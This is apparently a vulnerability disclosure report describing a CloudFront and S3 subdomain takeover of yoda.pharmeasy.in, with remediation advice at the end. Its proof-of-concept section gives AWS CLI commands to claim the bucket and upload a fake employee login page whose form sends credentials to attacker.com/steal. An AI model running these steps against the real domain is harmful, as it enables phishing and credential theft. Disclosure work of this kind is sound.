# ⚠️ CloudFront + S3 Takeover - yoda.pharmeasy.in

🔓 AWS CloudFront + S3 Subdomain Takeover

Target: yoda.pharmeasy.in

🚨 VULNERABILITY CONFIRMED

CloudFront distribution points to non-existent S3 bucket

$ curl -I https://yoda.pharmeasy.in
HTTP/1.1 403 Forbidden (or 404)
Server: CloudFront
X-Cache: Error from cloudfront
$ curl http://yoda.pharmeasy.in.s3.amazonaws.com
<Error><Code>NoSuchBucket</Code>
<Message>The specified bucket does not exist</Message>
<BucketName>yoda.pharmeasy.in</BucketName>

🔍 Attack Vector

  1. Current State: CloudFront → yoda.pharmeasy.in.s3.amazonaws.com (404)
  2. Attacker Action: Create S3 bucket named yoda.pharmeasy.in
  3. Attacker Action: Upload malicious HTML files to bucket
  4. Result: CloudFront serves attacker's content from S3
  5. Impact: Full control over https://yoda.pharmeasy.in

💥 Business Impact

  • Phishing: Host fake login at https://yoda.pharmeasy.in/login
  • Malware: Distribute malicious files under trusted domain
  • Brand Abuse: Post fake announcements/status updates
  • SEO Poisoning: Rank malicious pages with pharmeasy.in authority
  • Credential Harvesting: Steal employee/customer credentials

📋 Proof of Concept Steps

# 1. Attacker creates S3 bucket
aws s3 mb s3://yoda.pharmeasy.in

# 2. Upload phishing page
cat > index.html << 'EOF'
<h1>PharmEasy Employee Portal</h1>
<form action="https://attacker.com/steal">
  Email: <input type="email">
  Password: <input type="password">
</form>
EOF

aws s3 cp index.html s3://yoda.pharmeasy.in/
aws s3 website s3://yoda.pharmeasy.in/ --index-document index.html

Once S3 bucket exists, CloudFront automatically serves its content.

🛡️ Remediation

  1. Immediate: Delete CloudFront distribution
  2. Or: Create S3 bucket and secure it properly
  3. Preventive: Claim the S3 bucket name yourself
  4. Monitoring: Scan for dangling DNS records
